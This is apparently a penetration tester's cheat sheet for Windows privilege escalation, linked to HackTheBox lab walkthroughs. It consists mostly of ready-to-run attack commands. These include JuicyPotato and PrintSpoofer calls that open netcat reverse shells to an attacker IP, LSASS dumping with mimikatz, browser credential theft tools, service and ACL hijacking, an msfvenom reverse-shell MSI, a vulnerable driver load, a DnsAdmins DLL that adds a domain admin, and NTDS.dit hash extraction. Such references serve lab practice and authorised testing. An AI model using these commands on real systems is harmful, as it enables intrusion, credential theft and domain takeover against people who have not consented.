# Windows Privilege Escalation

## First Pass Enumeration

| Command | Description |
|---|---|
| `ipconfig /all` | Interfaces, IP, DNS |
| `arp -a` / `route print` | ARP and routing tables |
| `Get-MpComputerStatus` | Windows Defender status |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | AppLocker rules |
| `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` | Test whether AppLocker would block a specific binary |
| `systeminfo` | Full system config — patch level, install date, etc. |
| `wmic qfe` | Installed patches |
| `wmic product get name` | Installed software |
| `tasklist /svc` | Running processes + associated services |
| `whoami /priv` | **Check this immediately** — look for `SeImpersonatePrivilege`, `SeBackupPrivilege`, etc. |
| `whoami /groups` | Group memberships |
| `net user` / `net localgroup administrators` | Users and admin group membership |
| `net accounts` | Password policy |
| `netstat -ano` | Active connections |
| `gci \\.\pipe\` | List named pipes (PowerShell) |
| `accesschk.exe /accepteula \\.\Pipe\lsass -v` | Check permissions on a named pipe |

## SeImpersonatePrivilege → SYSTEM (Potato Family)

```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> 443 -e cmd.exe" -t *
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd"
```

If `whoami /priv` shows `SeImpersonatePrivilege` enabled, this is close to an automatic win — see [`job.md`](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/job.md) for a live example via Meterpreter's `getsystem`.

## Credential Theft

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Searching for stored credentials:**

```
findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
cmdkey /list
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

**PowerShell history / credential objects:**

```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

**Browser/tooling credential dumps:**

```
.\SharpChrome.exe logins /unprotect
.\lazagne.exe all
Invoke-SessionGopher -Target <HOST>
```

## Service Misconfigurations

**Unquoted service paths:**
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Weak service ACLs:**
```
accesschk.exe /accepteula "<USER>" -kvuqsw hklm\System\CurrentControlSet\services
sc config <SERVICE> binPath= "cmd /c net localgroup Administrators <USER> /add"
sc stop <SERVICE>; sc start <SERVICE>
```

**Modifying a service binary path via registry:**
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<SVC> -Name "ImagePath" -Value "C:\path\to\payload.exe"
```

**Replacing a service binary directly (requires write access):**
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
cmd /c copy /Y payload.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

## File/ACL Ownership Abuse

```
dir /q C:\backups\wwwroot\web.config              # check ownership
takeown /f C:\backups\wwwroot\web.config           # take ownership
icacls "C:\backups\wwwroot\web.config" /grant <USER>:F  # grant full control
```

## AlwaysInstallElevated (MSI)

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
If both keys show `AlwaysInstallElevated = 1`, any MSI installs with SYSTEM privileges:
```
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=9443 -f msi > payload.msi
msiexec /i payload.msi /quiet /qn /norestart
```

## Driver Loading Abuse (vulnerable signed driver)

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

## DNS Server Plugin DLL Abuse (domain-level, requires DnsAdmins)

```
msfvenom -p windows/x64/exec cmd='net group "domain admins" <USER> /add /domain' -f dll -o payload.dll
dnscmd.exe /config /serverlevelplugindll payload.dll
sc stop dns
sc start dns
```

## NTDS.dit Extraction

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Event Log Searching (finding creds passed on the command line)

```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## Recon Tools

```
.\SharpUp.exe audit
python2.7 windows-exploit-suggester.py --database <db>.xls --systeminfo out.txt
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection. Applied example: [Job](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/job.md) (`SeImpersonatePrivilege` → PrintSpoofer → SYSTEM)*

</div>
